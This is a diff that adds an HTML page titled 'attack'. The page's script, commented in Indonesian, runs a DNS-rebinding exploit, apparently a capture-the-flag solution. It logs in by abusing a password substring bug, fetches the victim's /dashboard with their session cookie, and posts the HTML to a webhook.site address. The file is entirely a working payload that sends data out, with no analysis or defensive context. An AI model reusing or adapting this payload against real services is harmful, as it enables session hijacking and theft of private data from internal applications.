@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>attack</title>
+<body>ok</body>
+<script>
+(async () => {
+  const WH = "https://webhook.site/a34dba35-cd60-4e77-bf38-101439a92e58"; // <= webhook kamu
+  const sleep = (ms)=>new Promise(r=>setTimeout(r,ms));
+  const ping = (msg)=>fetch(WH+"?log="+encodeURIComponent(msg)).catch(()=>{});
+  try {
+    // kasih jeda buat DNS rebind switch host → 1336
+    await sleep(1200);
+
+    // 1) login (bug substring: password in "replicanx....")
+    await fetch("/api/login?username=longlonglonguser&password=replicanx", {
+      credentials:"include", mode:"no-cors"
+    });
+    await sleep(400);
+
+    // 2) fetch dashboard (cookie HttpOnly dipakai otomatis)
+    const r = await fetch("/dashboard", { credentials:"include" });
+    const t = await r.text();
+
+    // 3) exfil ke webhook (POST body = HTML dashboard)
+    await fetch(WH, { method:"POST", headers:{ "Content-Type":"text/plain" }, body:t });
+
+    // sinyal sukses kecil (GET) biar keliatan cepat
+    await ping("ok");
+  } catch(e) {
+    await ping("err:"+String(e));
+  }
+})();
+</script>
+
